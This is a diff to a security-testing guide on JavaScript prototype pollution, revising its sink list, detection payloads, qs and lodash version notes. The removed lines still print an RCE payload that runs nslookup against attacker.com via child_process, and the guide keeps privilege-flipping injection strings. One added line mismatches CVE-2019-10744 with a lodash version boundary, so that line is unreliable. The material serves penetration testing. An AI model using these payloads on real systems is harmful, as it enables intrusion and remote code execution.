@@ -27,7 +27,7 @@ Prototype pollution is a JavaScript-specific vulnerability where an attacker can
 - Deep merge without key sanitization: `merge({}, userInput)` where `userInput` is attacker-controlled
 - Recursive property assignment: `obj[key1][key2] = value` where keys are attacker-controlled
 - Path-based setters: `_.set(obj, path, value)` where `path` is attacker-controlled
-- Clone operations on untrusted objects: `JSON.parse(JSON.stringify(untrusted))` (does not pollute, but `Object.assign({}, parsed)` can)
+- Deep merge on parsed objects: `_.merge({}, parsed)` or `deepmerge({}, parsed)` where `parsed` contains `__proto__` as an own key — `JSON.parse` and `Object.assign` are NOT pollution sinks (`Object.assign` is a shallow copy that changes the target object's own prototype reference but never reaches `Object.prototype` globally; `JSON.stringify/parse` round-trips strip `__proto__`)
 
 ## High-Value Targets
 
@@ -68,14 +68,13 @@ After submitting, check whether a subsequent request causes changed behavior con
 
 ### Server-Side Detection
 
-Inject a property that affects response behavior:
+Inject side-effect-free canary properties that alter observable response behavior without executing commands:
 ```json
 {"__proto__": {"toJSON": "polluted"}}
 {"__proto__": {"status": 200}}
-{"__proto__": {"outputFunctionName": "x;process.mainModule.require('child_process').execSync('nslookup attacker.com')//"}}
+{"__proto__": {"canary": "prototype_polluted"}}
 ```
-
-For blind detection, use an out-of-band DNS callback via a `child_process` gadget (Node.js).
+If the response changes (different status code, extra field, serialization error), pollution is confirmed. Once confirmed, escalate using the template engine gadgets in the Key Vulnerabilities section — do not run RCE payloads during the detection phase.
 
 ## Key Vulnerabilities
 
@@ -140,11 +139,11 @@ Pollute properties that break iteration or serialization:
 
 ### `qs` Library (Query String Parsing)
 
-The `qs` library allows deeply nested query strings by default. Without `allowPrototypes: false`:
+The `qs` library allows deeply nested query strings. **Since qs v6.0.4 (2017), `__proto__` keys are blocked by default** — this vector only applies to applications pinned to an older version or those explicitly passing `{ allowPrototypes: true }` to the parser. Check the application's `package-lock.json` or `yarn.lock` to confirm the version before testing:
 ```
 ?__proto__[admin]=true&__proto__[isLoggedIn]=true
 ```
-Parsed result: `{__proto__: {admin: true, isLoggedIn: true}}` — plain `Object.assign` or `merge` of this into any config poisons the prototype.
+Parsed result on a vulnerable version: `{__proto__: {admin: true, isLoggedIn: true}}` — a subsequent deep merge of this into any config poisons the prototype.
 
 ## Bypass Techniques
 
@@ -202,7 +201,7 @@ Parsed result: `{__proto__: {admin: true, isLoggedIn: true}}` — plain `Object.
 
 1. `constructor.prototype` is the most reliable bypass for `__proto__` string filters — always try both
 2. Gadget hunting is the key step; scan the application's minified JS for `options.src`, `config.html`, `settings.template` patterns
-3. `lodash.merge` prior to 4.17.17 is vulnerable; check the version in package-lock.json if accessible
+3. `lodash.merge` prior to 4.17.21 is vulnerable (CVE-2019-10744); check the version in package-lock.json if accessible — 4.17.21 is the fully patched boundary
 4. For Node.js apps using `qs` to parse query strings, test URL params with deeply nested bracket notation
 5. Pollution persists for the lifetime of the Node.js worker process (or browser page); a single successful injection affects all subsequent requests on that worker
 6. After polluting, check for behavioral changes in unrelated endpoints — prototype pollution is process-wide
